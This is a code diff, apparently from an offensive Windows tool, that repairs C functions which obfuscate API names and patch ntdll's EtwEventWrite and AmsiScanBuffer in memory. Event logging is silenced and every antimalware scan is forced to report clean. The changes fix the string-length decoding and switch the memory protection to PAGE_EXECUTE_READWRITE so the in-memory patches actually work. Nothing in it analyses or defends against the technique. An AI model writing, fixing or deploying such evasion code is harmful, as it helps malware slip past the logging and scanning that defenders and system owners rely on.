@@ -41,11 +41,11 @@ static unsigned char enc_ntsetinfothread[] = {
     0x2e, 0x12, 0x08, 0x1f, 0x1b, 0x1e
 };
 
-char* obf_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)); }
-char* obf_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)); }
-char* obf_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)); }
-char* obf_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)); }
-char* obf_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)); }
+char* obf_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)-1); }
+char* obf_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)-1); }
+char* obf_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)-1); }
+char* obf_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)-1); }
+char* obf_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)-1); }
 
 /* === ETW Bypass ===
  * Patch EtwEventWrite in ntdll.dll to return immediately.
@@ -62,7 +62,7 @@ void obf_bypass_etw(void) {
 
     /* Patch: ret (0xC3) — function returns immediately, no events logged */
     DWORD oldProtect = 0;
-    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_READWRITE, &oldProtect)) return;
+    if (!VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
     
     *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
     
@@ -84,7 +84,7 @@ void obf_bypass_amsi(void) {
     /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
      * Returns 0 (S_OK = clean) regardless of what was scanned */
     DWORD oldProtect = 0;
-    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_READWRITE, &oldProtect)) return;
+    if (!VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
     
     unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
     memcpy(pAmsiScanBuffer, patch, 3);
